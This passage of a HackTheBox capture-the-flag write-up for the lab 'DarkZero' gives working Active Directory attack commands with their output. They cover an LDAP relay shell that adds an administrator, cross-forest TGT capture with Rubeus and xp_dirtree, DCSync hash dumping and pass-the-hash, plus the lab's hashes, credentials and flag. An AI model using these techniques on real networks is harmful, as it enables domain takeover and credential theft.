[*] Authenticating connection from /@10.10.11.89 against ldaps://172.16.20.2 SUCCEED
[*] Started interactive Ldap shell via TCP on 127.0.0.1:11000 as /
```

Connect:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ nc 127.0.0.1 11000
```

```
# whoami
u:NT AUTHORITY\SYSTEM

# add_user sn0x
Adding new user with username: sn0x, password: <generated>
result: OK

# change_password sn0x 'Passw0rd123!'
Password changed successfully!

# add_user_to_group sn0x administrators
Adding user: sn0x to group Administrators result: OK
```

We're an LDAP shell running as SYSTEM (because DC02$ is equivalent to SYSTEM for LDAP operations). We created a user `sn0x` and added them to Administrators. Order matters here do the password change BEFORE adding to admin, because once they're admin you lose the ability to change passwords through this shell.

Verify and get a shell:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ proxychains nxc smb 172.16.20.2 -u sn0x -p 'Passw0rd123!'
SMB  172.16.20.2  445  DC02  [+] darkzero.ext\sn0x:Passw0rd123! (Pwn3d!)

└─$ proxychains impacket-psexec darkzero.ext/sn0x:'Passw0rd123!'@172.16.20.2
C:\Windows\system32> whoami
nt authority\system
```

***

### Lateral Movement  Capturing DC01$ via Kerberos Coercion

We're SYSTEM on DC02 (`172.16.20.2`, forest `darkzero.ext`). The root flag is on DC01 (`10.10.11.89`, forest `darkzero.htb`). Different forests, so the hashes we dumped from DC02 don't work on DC01 (different password databases). We need to attack `darkzero.htb` specifically.

**The plan:** Make DC01's SQL Server authenticate to DC02. The MSSQL service runs as `NT SERVICE\MSSQLSERVER` which authenticates as the `DC01$` computer account. DC01 is a Domain Controller in `darkzero.htb`. The forest trust between `darkzero.htb` and `darkzero.ext` has TGT delegation enabled meaning when DC01$ authenticates cross-forest, it sends its full TGT (not just a service ticket). If we catch that TGT, we can use it to perform a DCSync and dump all `darkzero.htb` hashes.

#### Setting Up Rubeus Monitor on DC02

Rubeus in monitor mode watches LSASS for new Kerberos tickets being added and prints them in real-time:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ impacket-smbserver share . -smb2support -username sn0x -password sn0x
```

On DC02:

```powershell
PS C:\temp> copy \\10.10.16.6\share\Rubeus.exe C:\temp\Rubeus.exe
PS C:\temp> .\Rubeus.exe monitor /interval:10 /nowrap
```

```
[*] Action: TGT Monitoring
[*] Monitoring every 10 seconds for new TGTs
[*] Target LUID: 0x0 (all sessions)
```

`/nowrap` prevents Base64 output from being line-wrapped, which would break the copy-paste and the base64 decode later.

#### Triggering DC01$ Authentication via xp\_dirtree

In a separate terminal, connect to DC01's MSSQL and run `xp_dirtree` pointing at a share on DC02:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ impacket-mssqlclient 'darkzero.htb/john.w:RFulUtONCOL!'@DC01.darkzero.htb -windows-auth
```

```sql
SQL (darkzero\john.w  guest@master)> xp_dirtree \\DC02.darkzero.ext\C$
```

`xp_dirtree` tries to list the contents of a remote UNC path. When DC01's SQL Server processes this, it needs to authenticate to `\\DC02.darkzero.ext\C$`. The SQL Server process runs as `NT SERVICE\MSSQLSERVER`, which authenticates as the DC01 computer account (`DC01$`). Kerberos is tried first DC01$ requests a TGT from its KDC, then a service ticket for `cifs/DC02.darkzero.ext`.

Because the forest trust has `TRUST_ATTRIBUTE_CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION` set, the TGT actually crosses the forest boundary rather than just a referral ticket being issued. DC02 receives and caches DC01$'s TGT from `darkzero.htb`.

Rubeus catches it:

```
[*] Found new TGT:

  User      : DC01$@DARKZERO.HTB
  StartTime : ...
  EndTime   : ... (+10 hours)
  Flags     : name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket:

    doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMM...
```

The `forwarded` and `forwardable` flags confirm this is the delegated TGT that crossed the forest trust. `DC01$@DARKZERO.HTB`  we have a ticket that belongs to the DC01 computer account in the `darkzero.htb` domain.

#### Converting the Ticket and DCSync

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ echo 'doIFjDCCBYig...' | base64 -d > dc01.kirbi
└─$ ticketConverter.py dc01.kirbi dc01.ccache
```

```
[*] converting kirbi to ccache...
[+] done
```

The ticket is in `.kirbi` format (Windows/Rubeus format) and needs to be converted to `.ccache` (Linux Kerberos credential cache format) for Impacket to use.

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ KRB5CCNAME=dc01.ccache impacket-secretsdump \
    -k -no-pass \
    'darkzero.htb/DC01$@DC01.darkzero.htb' \
    -just-dc
```

What's happening: `-k` means use Kerberos auth (our captured ticket), `-no-pass` means don't prompt, `DC01$` is the computer account, and `-just-dc` limits output to domain credentials only (skips local SAM). DCSync uses the Directory Replication Service (DRS) protocol normally used by DCs to sync their password databases to request all password hashes. This only works with DC-level privileges or Domain Admin, which `DC01$` has since it IS a domain controller.

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:64f4771e4c60b8b176c3769300f6f3f7:::
john.w:2603:aad3b435b51404eeaad3b435b51404ee:44b1b5623a1446b5831a7b3a4be3977b:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d02e3fe0986e9b5f013dad12b2350b3a:::
darkzero-ext$:2602:aad3b435b51404eeaad3b435b51404ee:f69a9340e0b70ca07af85bb35e691466:::
```

Administrator NTLM: `5917507bdf2ef2c2b0a869a1cba40726`

The LM hash (`aad3b435b51404eeaad3b435b51404ee`) is the same for everyone that's the hash for an empty password, which is the placeholder Windows uses when LM hashing is disabled. Only the NT hash matters.

***

### Root Flag

Pass-the-Hash with the Administrator NT hash:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkZero]
└─$ evil-winrm -i 10.10.11.89 -u administrator -H 5917507bdf2ef2c2b0a869a1cba40726
```

```
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
eb7c96126ab039e5d0f341c360eb3d88
```

Pass-the-Hash works with WinRM because NTLM authentication supports passing the hash directly without knowing the plaintext password. The NT hash IS the credential in NTLM there's no salting or additional challenge that requires the password.

***

### Full Attack Chain

```
[Kali: 10.10.16.6]
       |
       | HackTheBox gives us: john.w / RFulUtONCOL!
       |
       v
[DC01: 10.10.11.89 — darkzero.htb]
  MSSQL: john.w authenticates as guest (no xp_cmdshell)
  DNS query reveals 172.16.20.x internal subnet
       |
       | SQL Linked Server: john.w → dc01_sql_svc (sysadmin on DC02)
       | enable_xp_cmdshell → xp_cmdshell
       |
       v
[DC02: 172.16.20.2 — darkzero.ext] (internal, unreachable directly)
  Shell as darkzero-ext\svc_sql (token has SeImpersonatePrivilege stripped)
       |
       |--- PATH 1: NtObjectManager named pipe token steal
       |    Create pipe → connect \\localhost\pipe\x → impersonate client
       |    Recover full token with SeImpersonatePrivilege
       |    GodPotato (SeImpersonate abuse) → SYSTEM
       |
       |--- PATH 2: ADCS cert enrollment (intended)
       |    Chisel SOCKS tunnel → reach 172.16.20.x
       |    Rubeus tgtdeleg → TGT for svc_sql
       |    certipy req → User cert (enrolled with delegated TGT)
       |    certipy auth → NT hash via PKINIT + U2U
       |    changepasswd.py → new plaintext password for svc_sql
       |    RunasCs.exe --logon-type 5 → service logon (full token)
       |    GodPotato → SYSTEM
       |
       |--- PATH 3: CVE-2024-30088 (no patches on DC02)
       |    Meterpreter session → local_exploit_suggester
       |    cve_2024_30088_authz_basep → race condition in authz
       |    Steals winlogon SYSTEM token → SYSTEM shell
       |
       |--- PATH 4: NTLM reflection via CMTI DNS (unintended)
            Create DNS record encoding DC02's CMTI → points to Kali
            coerce_plus (PetitPotam) → DC02$ authenticates to us
            Local auth path → empty NTLM3, no MIC
            ntlmrelayx --remove-mic-partial → relay to DC02 LDAPS
            Interactive LDAP shell as SYSTEM
            Add user to Administrators
            psexec → SYSTEM
       |
       v
  NT AUTHORITY\SYSTEM on DC02 (user.txt captured)
       |
       | Chisel SOCKS tunnel: Kali → DC02 → 172.16.20.x (from Paths 2 & 4)
       |
       | Rubeus monitor running on DC02
       | New terminal: john.w MSSQL → xp_dirtree \\DC02.darkzero.ext\C$
       | DC01's MSSQL process (running as DC01$) authenticates cross-forest
       | Forest trust has TGT delegation enabled → full TGT crosses boundary
       | DC01$@DARKZERO.HTB ticket captured by Rubeus
       |
       | kirbi → ccache conversion
       | secretsdump -k with DC01$ ticket → DCSync darkzero.htb
       |
       v
  Administrator NTLM: 5917507bdf2ef2c2b0a869a1cba40726
       |
       | evil-winrm Pass-the-Hash
       |
       v
[DC01: 10.10.11.89]
  Administrator shell → root.txt
```

***

### Techniques I Used

| Technique                                        | Where Used                                                 | Why It Works                                                                                     |
| ------------------------------------------------ | ---------------------------------------------------------- | ------------------------------------------------------------------------------------------------ |
| SQL Linked Server Privilege Hop                  | john.w (guest on DC01) → dc01\_sql\_svc (sysadmin on DC02) | Credential mapping in linked server config escalates privileges cross-server                     |
| xp\_cmdshell OS Command Execution                | RCE on DC02 via linked server                              | sysadmin can re-enable this stored procedure to run shell commands                               |
| Split-Horizon DNS Enumeration                    | Discover 172.16.20.x internal subnet                       | DC has two A records, second one reveals the hidden internal interface                           |
| Named Pipe Token Theft (NtObjectManager)         | Recover full svc\_sql token                                | SMB redirector authenticates using LSASS-stored original service token, not filtered shell token |
| GodPotato (SeImpersonatePrivilege Abuse)         | svc\_sql (with full token) → SYSTEM                        | Fake COM server coerces SYSTEM auth; impersonating client gives SYSTEM token                     |
| Chisel SOCKS Tunneling                           | Pivot into 172.16.20.x from Kali                           | Creates reverse SOCKS5 proxy through DC02 so any tool can reach internal network                 |
| Rubeus tgtdeleg                                  | Extract delegatable TGT for svc\_sql                       | Mimics GSS-API delegation to export current user's TGT without admin rights                      |
| ADCS Certificate Enrollment (certipy)            | Get certificate for svc\_sql                               | Default User template allows any user to enroll; certificate used to prove identity              |
| PKINIT + U2U NT Hash Recovery                    | Extract svc\_sql NT hash via certipy auth                  | PKINIT authenticates with cert; U2U exchange reveals encrypted NT hash                           |
| kpasswd Password Change (changepasswd.py)        | Set new password for svc\_sql                              | TGT with `initial` flag has authority to change own password via kpasswd service                 |
| RunAsCs Service Logon (Type 5)                   | Start process with full unfiltered service token           | Service logon bypasses token filtering that stripped SeImpersonatePrivilege                      |
| CVE-2024-30088 (authz\_basep)                    | Local privesc on unpatched DC02                            | Race condition in authorization framework allows stealing SYSTEM token                           |
| CMTI DNS Poisoning                               | Create hostname that encodes DC02 target info              | Windows uses CMTI to determine if auth is "local," triggering weaker auth path                   |
| NTLM Relay with MIC Strip (impacket-partial-mic) | Relay DC02$ auth to its own LDAPS                          | Local auth path sends empty NTLM3 without MIC; custom Impacket fork accepts it                   |
| LDAP Shell via ntlmrelayx                        | Gain LDAP admin as DC02$                                   | Machine account has full domain admin on its own DC; used to add admin user                      |
| PetitPotam / DFSCoerce Coercion                  | Force DC02$ to authenticate outbound                       | Exploits EfsRpc/DFS protocol to trigger outbound machine account authentication                  |
| Rubeus TGT Monitor                               | Capture DC01$ ticket during coercion                       | Monitors LSASS for new tickets; xp\_dirtree forces DC01$ to auth cross-forest                    |
| xp\_dirtree Coercion                             | Make DC01$ Kerberos authenticate to DC02                   | SQL stored procedure attempts UNC path, triggering machine account auth                          |
| Cross-Forest TGT Delegation Abuse                | DC01$ ticket usable in darkzero.htb                        | Trust flag enables forwarding full TGT across forest rather than just referral ticket            |
| DCSync via Kerberos Ticket                       | Dump all darkzero.htb hashes as DC01$                      | DC computer account has DRS replication rights; mimics legitimate DC sync                        |
| Pass-the-Hash (evil-winrm)                       | Auth as Administrator using NT hash                        | NTLM auth uses the hash directly; no plaintext needed since hash IS the credential               |

<figure><img src="../../../../.gitbook/assets/complete (39).gif" alt=""><figcaption></figcaption></figure>
